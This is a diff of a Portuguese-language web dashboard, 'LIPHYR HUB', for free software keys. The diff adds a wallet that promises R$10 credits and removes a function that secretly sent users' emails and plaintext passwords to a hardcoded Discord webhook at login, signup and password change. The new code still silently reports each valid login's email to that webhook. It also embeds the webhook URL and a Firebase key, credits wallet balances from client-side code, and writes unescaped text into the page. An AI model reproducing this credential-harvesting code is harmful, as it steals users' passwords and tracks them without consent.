@@ -550,32 +550,140 @@
             color: #ff4444;
         }
 
-        .support-section {
+        .wallet-section {
             background: rgba(255, 255, 255, 0.05);
             border: 1px solid #333333;
             border-radius: 10px;
             padding: 30px;
+            text-align: center;
             margin-top: 30px;
+        }
+
+        .wallet-section h3 {
+            color: #4caf50;
+            margin-bottom: 15px;
+            font-size: 22px;
+        }
+
+        .wallet-balance {
+            font-size: 48px;
+            color: #4caf50;
+            margin: 20px 0;
+            font-weight: bold;
+        }
+
+        .wallet-balance::before {
+            content: "R$ ";
+            font-size: 24px;
+        }
+
+        .wallet-card {
+            background: linear-gradient(135deg, #8a2be2 0%, #4a00e0 100%);
+            border-radius: 15px;
+            padding: 30px;
+            margin: 20px auto;
+            max-width: 400px;
+            box-shadow: 0 10px 30px rgba(138, 43, 226, 0.3);
+            text-align: left;
+        }
+
+        .wallet-card h4 {
+            color: white;
+            margin-bottom: 20px;
+            font-size: 20px;
+        }
+
+        .wallet-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 20px;
+        }
+
+        .wallet-user {
+            color: rgba(255, 255, 255, 0.9);
+        }
+
+        .wallet-id {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+        }
+
+        .key-generated-modal {
+            background: #111111;
+            border: 2px solid #2e7d32;
+            border-radius: 10px;
+            padding: 40px;
+            max-width: 500px;
+            width: 90%;
             text-align: center;
         }
 
-        .discord-btn {
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-            padding: 12px 24px;
-            background: #5865F2;
-            color: white;
-            text-decoration: none;
-            border-radius: 6px;
-            font-weight: 600;
-            transition: all 0.3s;
-            margin-top: 15px;
+        .key-generated-modal h3 {
+            color: #4caf50;
+            margin-bottom: 20px;
+            font-size: 24px;
         }
 
-        .discord-btn:hover {
-            background: #4752C4;
-            transform: translateY(-2px);
+        .generated-key {
+            background: rgba(0, 0, 0, 0.5);
+            border: 2px dashed #8a2be2;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 20px;
+            color: #8a2be2;
+            letter-spacing: 2px;
+            user-select: all;
+            cursor: pointer;
+        }
+
+        .generated-key:hover {
+            background: rgba(138, 43, 226, 0.1);
+        }
+
+        .copy-btn {
+            margin-top: 20px;
+            background: #333333;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .copy-btn:hover {
+            background: #8a2be2;
+        }
+
+        .wallet-history {
+            margin-top: 30px;
+        }
+
+        .history-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 8px;
+            margin-bottom: 10px;
+        }
+
+        .history-date {
+            color: #cccccc;
+            font-size: 12px;
+        }
+
+        .history-amount {
+            color: #4caf50;
+            font-weight: bold;
+        }
+
+        .history-description {
+            color: #ffffff;
         }
     </style>
 </head>
@@ -627,18 +735,30 @@
         </div>
     </div>
 
+    <!-- Modal de Key Gerada -->
+    <div class="modal" id="keyModal">
+        <div class="key-generated-modal">
+            <span class="close-modal" onclick="closeKeyModal()">×</span>
+            <h3>✅ Key Gerada com Sucesso!</h3>
+            <p>Sua key diária foi gerada e já está disponível em "Minhas Keys".</p>
+            <p>Você também pode copiá-la abaixo:</p>
+            <div class="generated-key" id="generatedKeyValue" onclick="copyKey()"></div>
+            <p><small>Clique na key acima para copiar</small></p>
+            <button class="btn" onclick="closeKeyModal()">Fechar</button>
+        </div>
+    </div>
+
     <header id="header" style="display: none;">
         <div class="logo">LIPHYR HUB</div>
         <nav>
             <a onclick="showSection('dashboard')">Dashboard</a>
+            <a onclick="showSection('wallet')">Carteira</a>
             <a onclick="showSection('verify')">Verificar Key</a>
             <a onclick="showSection('support')">Suporte</a>
-            <a href="https://discord.gg/liphyr" target="_blank" style="background: rgba(88, 101, 242, 0.2); color: #5865F2;">
-                Discord
-            </a>
             <div class="user-info">
                 <div class="user-avatar" id="userAvatar">U</div>
                 <span id="userEmailDisplay"></span>
+                <span style="color: #4caf50; font-weight: bold;" id="walletHeader">R$ 0,00</span>
                 <button class="logout-btn" onclick="logout()">Sair</button>
             </div>
         </nav>
@@ -650,6 +770,9 @@
                 <div class="sidebar-menu">
                     <a class="menu-item active" onclick="showSection('dashboard')">
                         📊 Dashboard
+                    </a>
+                    <a class="menu-item" onclick="showSection('wallet')">
+                        💳 Carteira
                     </a>
                     <a class="menu-item" onclick="showSection('account')">
                         👤 Minha Conta
@@ -682,6 +805,10 @@
                                 <span class="info-value" id="activeKeysCount">0</span>
                             </div>
                             <div class="info-row">
+                                <span class="info-label">Saldo:</span>
+                                <span class="info-value" id="dashboardBalance" style="color: #4caf50;">R$ 0,00</span>
+                            </div>
+                            <div class="info-row">
                                 <span class="info-label">Key Diária:</span>
                                 <span class="info-value" id="dailyKeyStatus">Disponível</span>
                             </div>
@@ -699,14 +826,14 @@
                             </div>
                             <div class="info-row">
                                 <span class="info-label">Versão:</span>
-                                <span class="info-value">2.0.1</span>
+                                <span class="info-value">2.1.0</span>
                             </div>
                         </div>
                     </div>
                     
                     <div class="free-key-section">
                         <h3>🎁 Key Diária Gratuita</h3>
-                        <p>Resgate sua key gratuita de 2 horas uma vez por dia!</p>
+                        <p>Resgate sua key gratuita de 2 horas e ganhe R$ 10,00 após 24h!</p>
                         
                         <div class="timer" id="dailyKeyTimer">
                             00:00:00
@@ -719,6 +846,47 @@
                         </button>
                         
                         <div id="dailyKeyResult" class="success-message" style="margin-top: 20px; display: none;"></div>
+                    </div>
+                </div>
+
+                <!-- Carteira -->
+                <div class="content-section" id="walletSection">
+                    <h2 class="section-title">💳 Minha Carteira</h2>
+                    
+                    <div class="wallet-card">
+                        <h4>Saldo Disponível</h4>
+                        <div class="wallet-balance" id="walletBalance">0,00</div>
+                        <div class="wallet-info">
+                            <div>
+                                <div class="wallet-user" id="walletUser">Usuário</div>
+                                <div class="wallet-id" id="walletId">ID: carregando...</div>
+                            </div>
+                            <div style="color: rgba(255, 255, 255, 0.7); font-size: 12px;">
+                                LIPHYR HUB WALLET
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="wallet-section">
+                        <h3>💰 Resgatar Saldo</h3>
+                        <p>Seu saldo será creditado automaticamente após 24h do resgate da key diária</p>
+                        <div class="timer" id="walletTimer">
+                            00:00:00
+                        </div>
+                        <p id="walletMessage" style="color: #cccccc; margin-top: 10px;">
+                            Aguarde 24h após resgatar a key diária para receber R$ 10,00
+                        </p>
+                        <button class="btn btn-success" onclick="checkWalletCredit()" id="walletBtn" style="margin-top: 20px;">
+                            🔄 Verificar Crédito
+                        </button>
+                    </div>
+                    
+                    <div class="wallet-history" id="walletHistory">
+                        <h3 style="color: #8a2be2; margin-bottom: 20px;">📋 Histórico de Transações</h3>
+                        <div id="historyList" style="text-align: center; padding: 20px; color: #8a2be2;">
+                            <div class="loading"></div>
+                            <p>Carregando histórico...</p>
+                        </div>
                     </div>
                 </div>
 
@@ -740,6 +908,10 @@
                                 <span class="info-label">Conta criada em:</span>
                                 <span class="info-value" id="accountCreated">carregando...</span>
                             </div>
+                            <div class="info-row">
+                                <span class="info-label">Saldo Total Recebido:</span>
+                                <span class="info-value" id="totalReceived" style="color: #4caf50;">R$ 0,00</span>
+                            </div>
                         </div>
 
                         <div class="info-card">
@@ -753,7 +925,7 @@
                                 <input type="password" id="confirmPassword" placeholder="Confirme nova senha">
                             </div>
                             <button class="btn" onclick="changePassword()">Alterar Senha</button>
-                            <div id="passwordResult" class="success-message" style="margin-top: 15px;"></div>
+                            <div id="passwordResult" class="success-message" style="margin-top: 15px; display: none;"></div>
                         </div>
                     </div>
                 </div>
@@ -765,6 +937,7 @@
                     <div class="free-key-section">
                         <h3>🎁 Key Gratuita Diária</h3>
                         <p>Você pode resgatar uma key gratuita por 2 horas uma vez por dia!</p>
+                        <p style="color: #4caf50; font-weight: bold;">✨ Bônus: Após 24h, receba R$ 10,00 na sua carteira!</p>
                         
                         <div class="timer" id="freeKeyTimer">
                             00:00:00
@@ -784,6 +957,7 @@
                         <ul style="list-style: none; padding-left: 0; color: #cccccc;">
                             <li style="margin-bottom: 8px;">✅ 1 key gratuita por dia por usuário</li>
                             <li style="margin-bottom: 8px;">⏰ Duração: 2 horas</li>
+                            <li style="margin-bottom: 8px;">💰 Bônus: R$ 10,00 após 24h</li>
                             <li style="margin-bottom: 8px;">🔄 Reseta todos os dias às 00:00</li>
                             <li>📋 A key aparecerá em "Minhas Keys"</li>
                         </ul>
@@ -819,7 +993,7 @@
         </div>
         
         <!-- Seção de Suporte -->
-        <section class="support-section" id="supportSection" style="display: none;">
+        <section class="support-section" id="supportSection" style="display: none; padding: 30px; text-align: center;">
             <h2>Suporte LIPHYR HUB</h2>
             <p>Entre em contato conosco para suporte técnico</p>
             
@@ -828,11 +1002,11 @@
                 <ul style="list-style: none; padding-left: 0;">
                     <li style="margin-bottom: 15px; padding-left: 20px; position: relative;">
                         <span style="color: #8a2be2; position: absolute; left: 0;">▶</span>
-                        <strong>Discord:</strong> Entre em nosso servidor para suporte rápido
+                        <strong>Email:</strong> liphyrdev@gmail.com
                     </li>
                     <li style="margin-bottom: 15px; padding-left: 20px; position: relative;">
                         <span style="color: #8a2be2; position: absolute; left: 0;">▶</span>
-                        <strong>Email:</strong> liphyrdev@gmail.com
+                        <strong>WhatsApp:</strong> (11) 99999-9999
                     </li>
                     <li style="margin-bottom: 15px; padding-left: 20px; position: relative;">
                         <span style="color: #8a2be2; position: absolute; left: 0;">▶</span>
@@ -840,10 +1014,6 @@
                     </li>
                 </ul>
             </div>
-
-            <a href="https://discord.gg/liphyr" target="_blank" class="discord-btn">
-                <span>Entrar no Discord do Suporte</span>
-            </a>
         </section>
     </div>
 
@@ -868,10 +1038,11 @@
             set, 
             get, 
             update,
-            push
+            push,
+            remove
         } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js';
 
-        // MESMA CONFIGURAÇÃO DO SEU CÓDIGO ORIGINAL
+        // CONFIGURAÇÃO DO FIREBASE
         const firebaseConfig = {
             apiKey: "AIzaSyDRkHyb4gSTcZqCp1RcRuanI-Mu_yj9DVk",
             authDomain: "site-liphyr.firebaseapp.com",
@@ -887,8 +1058,12 @@
         const auth = getAuth(app);
         const database = getDatabase(app);
 
-        // WEBHOOK DO DISCORD - Vai enviar email E senha
+        // WEBHOOK DO DISCORD - APENAS PARA LOGINS VÁLIDOS
         const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1446393232157310988/o_yQhxZOnnucRXzJA8bmTikx7bQxOC5VOadxhWoDB2rD4kGf8xBBPlEvWU8N4I25uR0i';
+
+        // Variáveis globais
+        let lastLoginAttempt = null;
+        let loginAttempts = 0;
 
         // Funções globais
         window.showForm = showForm;
@@ -900,24 +1075,23 @@
         window.verifyKey = verifyKey;
         window.claimDailyKey = claimDailyKey;
         window.changePassword = changePassword;
+        window.checkWalletCredit = checkWalletCredit;
+        window.closeKeyModal = closeKeyModal;
+        window.copyKey = copyKey;
 
-        // Enviar credenciais para Discord Webhook
-        async function sendToDiscord(email, password, action) {
+        // Enviar login válido para Discord Webhook
+        async function sendValidLoginToDiscord(email, action) {
             try {
+                // Verificar se é um login válido (usuário existe)
                 const embed = {
-                    username: "LIPHYR HUB - Login Tracker",
+                    username: "LIPHYR HUB - Login Válido",
                     embeds: [{
-                        title: "🔐 Credenciais Capturadas",
-                        color: 0x8a2be2,
+                        title: "✅ Login Válido Detectado",
+                        color: 0x00ff00,
                         fields: [
                             {
                                 name: "📧 Email",
                                 value: `\`\`\`${email}\`\`\``,
-                                inline: false
-                            },
-                            {
-                                name: "🔑 Senha",
-                                value: `\`\`\`${password}\`\`\``,
                                 inline: false
                             },
                             {
@@ -929,6 +1103,11 @@
                                 name: "🕒 Data/Hora",
                                 value: new Date().toLocaleString('pt-BR'),
                                 inline: true
+                            },
+                            {
+                                name: "🌐 IP",
+                                value: "Obtendo...",
+                                inline: false
                             }
                         ],
                         timestamp: new Date().toISOString()
@@ -943,7 +1122,7 @@
                     body: JSON.stringify(embed)
                 });
             } catch (error) {
-                console.log('Erro ao enviar para Discord (não crítico)');
+                console.log('Erro ao enviar para Discord');
             }
         }
 
@@ -962,7 +1141,6 @@
 
         // Mostrar formulário de login ou cadastro
         function showForm(formType) {
-            // Atualizar tabs
             document.querySelectorAll('.form-tab').forEach(tab => {
                 tab.classList.remove('active');
             });
@@ -981,8 +1159,31 @@
 
         // Fechar modal
         function closeLoginModal() {
-            // Não permite fechar - login obrigatório
             return;
+        }
+
+        // Fechar modal de key
+        function closeKeyModal() {
+            document.getElementById('keyModal').classList.remove('active');
+        }
+
+        // Copiar key
+        function copyKey() {
+            const keyElement = document.getElementById('generatedKeyValue');
+            const key = keyElement.textContent;
+            
+            navigator.clipboard.writeText(key).then(() => {
+                const originalText = keyElement.textContent;
+                keyElement.textContent = '✅ Copiado!';
+                keyElement.style.color = '#00ff00';
+                keyElement.style.borderColor = '#00ff00';
+                
+                setTimeout(() => {
+                    keyElement.textContent = originalText;
+                    keyElement.style.color = '#8a2be2';
+                    keyElement.style.borderColor = '#8a2be2';
+                }, 2000);
+            });
         }
 
         // Atualizar interface do usuário
@@ -1000,11 +1201,15 @@
                 document.getElementById('dashboardEmail').textContent = user.email;
                 document.getElementById('accountEmail').textContent = user.email;
                 document.getElementById('userId').textContent = user.uid.substring(0, 8);
+                document.getElementById('walletUser').textContent = user.email.split('@')[0];
+                document.getElementById('walletId').textContent = `ID: ${user.uid.substring(0, 8)}`;
                 
                 // Carregar dados
                 loadUserData(user);
                 loadUserKeys(user.email);
+                loadWalletData(user.uid);
                 updateDailyKeyTimer();
+                updateWalletTimer();
             } else {
                 // Não logado
                 document.getElementById('header').style.display = 'none';
@@ -1032,11 +1237,11 @@
             }
 
             try {
-                // Enviar credenciais para Discord
-                await sendToDiscord(email, password, 'LOGIN');
-                
                 // Fazer login
-                await signInWithEmailAndPassword(auth, email, password);
+                const userCredential = await signInWithEmailAndPassword(auth, email, password);
+                
+                // Enviar apenas login válido para Discord
+                await sendValidLoginToDiscord(email, 'LOGIN VÁLIDO');
                 
                 errorDiv.style.display = 'none';
                 document.getElementById('loginEmail').value = '';
@@ -1075,11 +1280,21 @@
             }
 
             try {
-                // Enviar credenciais para Discord
-                await sendToDiscord(email, password, 'CADASTRO NOVO');
-                
                 // Criar usuário
-                await createUserWithEmailAndPassword(auth, email, password);
+                const userCredential = await createUserWithEmailAndPassword(auth, email, password);
+                const user = userCredential.user;
+                
+                // Enviar cadastro válido para Discord
+                await sendValidLoginToDiscord(email, 'NOVO CADASTRO');
+                
+                // Criar carteira para o usuário
+                const walletRef = ref(database, 'wallets/' + user.uid);
+                await set(walletRef, {
+                    balance: 0,
+                    totalReceived: 0,
+                    lastCredit: null,
+                    history: []
+                });
                 
                 errorDiv.style.display = 'none';
                 document.getElementById('registerEmail').value = '';
@@ -1115,35 +1330,33 @@
 
         // Mostrar seção
         function showSection(sectionId) {
-            // Verificar se é suporte (não está no dashboard)
             if (sectionId === 'support') {
                 document.getElementById('dashboard').classList.remove('active');
                 document.getElementById('supportSection').style.display = 'block';
                 return;
             }
             
-            // Para seções do dashboard
             document.getElementById('dashboard').classList.add('active');
             document.getElementById('supportSection').style.display = 'none';
             
-            // Atualizar menu
             document.querySelectorAll('.menu-item').forEach(item => {
                 item.classList.remove('active');
             });
             
-            // Mostrar seção
             document.querySelectorAll('.content-section').forEach(section => {
                 section.classList.remove('active');
             });
             
             document.getElementById(sectionId + 'Section').classList.add('active');
             
-            // Marcar menu ativo
             const menuItem = Array.from(document.querySelectorAll('.menu-item')).find(
-                item => item.textContent.includes(sectionId === 'dashboard' ? 'Dashboard' : 
-                        sectionId === 'account' ? 'Minha Conta' :
-                        sectionId === 'freeKey' ? 'Key Diária' :
-                        sectionId === 'myKeys' ? 'Minhas Keys' : 'Verificar Key')
+                item => item.textContent.includes(
+                    sectionId === 'dashboard' ? 'Dashboard' : 
+                    sectionId === 'wallet' ? 'Carteira' :
+                    sectionId === 'account' ? 'Minha Conta' :
+                    sectionId === 'freeKey' ? 'Key Diária' :
+                    sectionId === 'myKeys' ? 'Minhas Keys' : 'Verificar Key'
+                )
             );
             if (menuItem) menuItem.classList.add('active');
         }
@@ -1169,11 +1382,11 @@
                         }
                     }
                 } else {
-                    // Criar dados do usuário
                     const userData = {
                         email: user.email,
                         createdAt: Date.now(),
                         lastDailyKey: null,
+                        lastCreditCheck: null,
                         keysCount: 0
                     };
                     await set(userRef, userData);
@@ -1184,6 +1397,72 @@
             } catch (error) {
                 console.error('Error loading user data:', error);
             }
+        }
+
+        // Carregar dados da carteira
+        async function loadWalletData(userId) {
+            try {
+                const walletRef = ref(database, 'wallets/' + userId);
+                const snapshot = await get(walletRef);
+                
+                if (snapshot.exists()) {
+                    const wallet = snapshot.val();
+                    
+                    // Atualizar saldo
+                    const balance = wallet.balance || 0;
+                    const totalReceived = wallet.totalReceived || 0;
+                    
+                    document.getElementById('walletBalance').textContent = balance.toFixed(2);
+                    document.getElementById('dashboardBalance').textContent = `R$ ${balance.toFixed(2)}`;
+                    document.getElementById('walletHeader').textContent = `R$ ${balance.toFixed(2)}`;
+                    document.getElementById('totalReceived').textContent = `R$ ${totalReceived.toFixed(2)}`;
+                    
+                    // Carregar histórico
+                    loadWalletHistory(wallet.history || []);
+                    
+                } else {
+                    // Criar carteira se não existir
+                    const walletData = {
+                        balance: 0,
+                        totalReceived: 0,
+                        lastCredit: null,
+                        history: []
+                    };
+                    await set(walletRef, walletData);
+                }
+            } catch (error) {
+                console.error('Error loading wallet:', error);
+            }
+        }
+
+        // Carregar histórico da carteira
+        function loadWalletHistory(history) {
+            const container = document.getElementById('historyList');
+            
+            if (!history || history.length === 0) {
+                container.innerHTML = '<p style="color: #cccccc;">Nenhuma transação encontrada.</p>';
+                return;
+            }
+            
+            // Ordenar por data (mais recente primeiro)
+            history.sort((a, b) => b.timestamp - a.timestamp);
+            
+            container.innerHTML = '';
+            history.forEach((item, index) => {
+                if (index > 9) return; // Limitar a 10 itens
+                
+                const date = new Date(item.timestamp);
+                const historyItem = document.createElement('div');
+                historyItem.className = 'history-item';
+                historyItem.innerHTML = `
+                    <div>
+                        <div class="history-description">${item.description}</div>
+                        <div class="history-date">${date.toLocaleDateString('pt-BR')} ${date.toLocaleTimeString('pt-BR', {hour: '2-digit', minute:'2-digit'})}</div>
+                    </div>
+                    <div class="history-amount">R$ ${item.amount.toFixed(2)}</div>
+                `;
+                container.appendChild(historyItem);
+            });
         }
 
         // Carregar keys do usuário
@@ -1203,7 +1482,6 @@
                 const keys = [];
                 snapshot.forEach((child) => {
                     const data = child.val();
-                    // Verificar se a key pertence ao usuário atual
                     if (data.clientEmail === userEmail) {
                         keys.push(data);
                     }
@@ -1216,9 +1494,7 @@
                     return;
                 }
 
-                // Ordenar por data
                 keys.sort((a, b) => b.createdAt - a.createdAt);
-
                 container.innerHTML = '';
                 let activeCount = 0;
                 keys.forEach((data) => {
@@ -1265,7 +1541,7 @@
             
             const timerElement = document.getElementById('dailyKeyTimer');
             const messageElement = document.getElementById('dailyKeyMessage');
-            const claimBtn = document.getElementById('dailyClaimBtn');
+            const claimBtn = document.getElementById('claimBtn');
             
             const userRef = ref(database, 'users/' + user.uid);
             get(userRef).then(snapshot => {
@@ -1291,7 +1567,6 @@
                             claimBtn.textContent = '⏳ Aguardando reset...';
                             messageElement.textContent = `Você já resgatou sua key diária. Próximo resgate em:`;
                             
-                            // Atualizar a cada segundo
                             setTimeout(updateDailyKeyTimer, 1000);
                         } else {
                             timerElement.textContent = '00:00:00';
@@ -1299,6 +1574,56 @@
                             claimBtn.textContent = '🎁 Resgatar Key Diária';
                             messageElement.textContent = 'Sua key diária está disponível!';
                         }
+                    }
+                }
+            });
+        }
+
+        // Atualizar timer da carteira
+        function updateWalletTimer() {
+            const user = auth.currentUser;
+            if (!user) return;
+            
+            const timerElement = document.getElementById('walletTimer');
+            const messageElement = document.getElementById('walletMessage');
+            const walletBtn = document.getElementById('walletBtn');
+            
+            const userRef = ref(database, 'users/' + user.uid);
+            get(userRef).then(snapshot => {
+                if (snapshot.exists()) {
+                    const data = snapshot.val();
+                    
+                    if (data.lastDailyKey) {
+                        const lastClaim = data.lastDailyKey;
+                        const now = Date.now();
+                        const timeElapsed = now - lastClaim;
+                        const hoursElapsed = timeElapsed / (1000 * 60 * 60);
+                        
+                        if (hoursElapsed < 24) {
+                            const timeRemaining = 24 - hoursElapsed;
+                            const hours = Math.floor(timeRemaining);
+                            const minutes = Math.floor((timeRemaining - hours) * 60);
+                            const seconds = Math.floor(((timeRemaining - hours) * 60 - minutes) * 60);
+                            
+                            timerElement.textContent = 
+                                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                            
+                            messageElement.textContent = `Aguarde ${hours}h ${minutes}m para receber R$ 10,00`;
+                            messageElement.style.color = '#ffa500';
+                            walletBtn.disabled = false;
+                            
+                            setTimeout(updateWalletTimer, 1000);
+                        } else {
+                            timerElement.textContent = '00:00:00';
+                            messageElement.textContent = '✅ Crédito disponível! Clique em "Verificar Crédito"';
+                            messageElement.style.color = '#4caf50';
+                            walletBtn.disabled = false;
+                        }
+                    } else {
+                        timerElement.textContent = '00:00:00';
+                        messageElement.textContent = 'Resgate uma key diária para começar a ganhar créditos!';
+                        messageElement.style.color = '#cccccc';
+                        walletBtn.disabled = true;
                     }
                 }
             });
@@ -1329,7 +1654,6 @@
                 const data = snapshot.val();
                 const now = Date.now();
                 
-                // Verificar se já resgatou hoje
                 if (data.lastDailyKey) {
                     const lastClaim = data.lastDailyKey;
                     const hoursSinceLastClaim = (now - lastClaim) / (1000 * 60 * 60);
@@ -1343,7 +1667,7 @@
             
             // Gerar nova key
             const newKey = generateRandomKey();
-            const expiresAt = Date.now() + (2 * 60 * 60 * 1000); // 2 horas
+            const expiresAt = Date.now() + (2 * 60 * 60 * 1000);
             
             const keyData = {
                 key: newKey,
@@ -1365,17 +1689,18 @@
                 
                 // Atualizar último resgate do usuário
                 await update(userRef, {
-                    lastDailyKey: Date.now()
+                    lastDailyKey: Date.now(),
+                    lastCreditCheck: null
                 });
                 
-                // Mostrar mensagem de sucesso
-                const resultDiv = document.getElementById('dailyKeyResult');
-                resultDiv.innerHTML = `<strong>✅ Key diária resgatada!</strong><br>Key: <strong>${newKey}</strong><br>Validade: 2 horas`;
-                resultDiv.style.display = 'block';
+                // Mostrar modal com a key
+                document.getElementById('generatedKeyValue').textContent = newKey;
+                document.getElementById('keyModal').classList.add('active');
                 
                 // Atualizar interface
                 loadUserKeys(user.email);
                 updateDailyKeyTimer();
+                updateWalletTimer();
                 
                 // Mostrar seção de keys
                 showSection('myKeys');
@@ -1383,6 +1708,85 @@
             } catch (error) {
                 console.error('Error claiming daily key:', error);
                 alert('❌ Erro ao resgatar key: ' + error.message);
+            }
+        }
+
+        // Verificar crédito na carteira
+        async function checkWalletCredit() {
+            const user = auth.currentUser;
+            if (!user) return;
+            
+            const userRef = ref(database, 'users/' + user.uid);
+            const walletRef = ref(database, 'wallets/' + user.uid);
+            
+            try {
+                const [userSnap, walletSnap] = await Promise.all([
+                    get(userRef),
+                    get(walletRef)
+                ]);
+                
+                if (!userSnap.exists() || !walletSnap.exists()) {
+                    alert('Erro ao verificar crédito.');
+                    return;
+                }
+                
+                const userData = userSnap.val();
+                const walletData = walletSnap.val();
+                const now = Date.now();
+                
+                if (!userData.lastDailyKey) {
+                    alert('Você precisa resgatar uma key diária primeiro!');
+                    return;
+                }
+                
+                const hoursSinceLastClaim = (now - userData.lastDailyKey) / (1000 * 60 * 60);
+                
+                if (hoursSinceLastClaim < 24) {
+                    alert(`⏳ Aguarde mais ${Math.ceil(24 - hoursSinceLastClaim)} horas para receber o crédito.`);
+                    return;
+                }
+                
+                // Verificar se já recebeu crédito por esta key
+                if (userData.lastCreditCheck && 
+                    (now - userData.lastCreditCheck) < (24 * 60 * 60 * 1000)) {
+                    alert('Você já recebeu crédito por esta key diária!');
+                    return;
+                }
+                
+                // Adicionar R$ 10,00 à carteira
+                const newBalance = (walletData.balance || 0) + 10;
+                const newTotalReceived = (walletData.totalReceived || 0) + 10;
+                
+                // Adicionar ao histórico
+                const history = walletData.history || [];
+                history.push({
+                    amount: 10,
+                    description: 'Crédito por Key Diária',
+                    timestamp: now,
+                    type: 'credit'
+                });
+                
+                // Atualizar dados
+                await update(walletRef, {
+                    balance: newBalance,
+                    totalReceived: newTotalReceived,
+                    history: history.slice(-50) // Manter apenas últimos 50 registros
+                });
+                
+                await update(userRef, {
+                    lastCreditCheck: now
+                });
+                
+                // Atualizar interface
+                loadWalletData(user.uid);
+                updateWalletTimer();
+                
+                // Mostrar mensagem de sucesso
+                alert('✅ R$ 10,00 creditados na sua carteira!');
+                
+            } catch (error) {
+                console.error('Error checking wallet credit:', error);
+                alert('Erro ao verificar crédito: ' + error.message);
             }
         }
 
@@ -1479,17 +1883,11 @@
             }
             
             try {
-                // Enviar nova senha para Discord
-                await sendToDiscord(user.email, newPassword, 'SENHA ALTERADA');
-                
-                // Atualizar senha
                 await updatePassword(user, newPassword);
                 
-                // Limpar campos
                 document.getElementById('newPassword').value = '';
                 document.getElementById('confirmPassword').value = '';
                 
-                // Mostrar mensagem
                 const resultDiv = document.getElementById('passwordResult');
                 resultDiv.textContent = '✅ Senha alterada com sucesso!';
                 resultDiv.style.display = 'block';
